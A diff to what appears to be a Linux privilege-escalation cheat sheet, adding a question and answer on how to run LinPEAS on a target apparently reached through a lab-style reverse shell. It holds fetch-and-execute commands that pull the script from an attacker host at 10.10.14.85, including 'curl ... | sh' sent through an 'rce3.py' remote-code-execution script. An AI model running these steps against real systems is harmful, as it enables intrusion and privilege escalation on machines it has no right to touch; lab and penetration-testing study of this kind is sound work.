@@ -510,3 +510,35 @@ find / -writable 2>/dev/null | grep -v proc
 
 Automated tools:
 ./linpeas.sh               # covers all of the above and more
+
+
+
+
+---
+
+how can I run /.linpeas.sh
+
+First you need to get the script onto the target. A few ways:
+
+Option 1 — host it from Kali and wget/curl it on the target:
+
+On Kali:
+# download linpeas if you don't have it
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+
+# host it
+python3 -m http.server 8080
+
+On the target (via your reverse shell):
+cd /tmp
+wget http://10.10.14.85:8080/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
+Option 2 — run it directly without writing to disk:
+curl http://10.10.14.85:8080/linpeas.sh | sh
+
+Option 3 — via your rce script (no shell yet):
+python3 rce3.py "curl http://10.10.14.85:8080/linpeas.sh | sh"
+
+Note: LinPEAS produces a lot of output. If you're running it through rce3.py the 5 second timeout will cut it off. It works best inside an interactive reverse shell where you can scroll through the full output — the interesting findings are color coded in red/yellow.
